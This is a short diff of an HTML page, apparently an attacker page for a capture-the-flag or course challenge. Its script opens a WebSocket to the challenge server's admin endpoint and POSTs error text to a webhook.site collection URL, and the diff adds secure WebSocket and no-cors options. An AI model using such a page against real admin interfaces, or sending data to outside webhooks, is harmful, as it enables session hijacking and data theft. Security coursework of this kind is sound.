@@ -3,7 +3,7 @@
 <body>
 <script>
 try {
-    const ws = new WebSocket("ws://ce441-web.spchallenge.ir:1202/admin/ws");
+    const ws = new WebSocket("wss://ce441-web.spchallenge.ir:1202/admin/ws");
 
     
     ws.onopen = () => {
@@ -19,7 +19,7 @@ try {
     };
 
 } catch (e) {
-    fetch("https://webhook.site/7ddae2c9-35c0-47d4-b10b-c54260f87086", {method:"POST", body:"error:"+e});
+    fetch("https://webhook.site/7ddae2c9-35c0-47d4-b10b-c54260f87086", {method:"POST", mode:"no-cors", body:"error:"+e});
 }
 </script>
 </body>
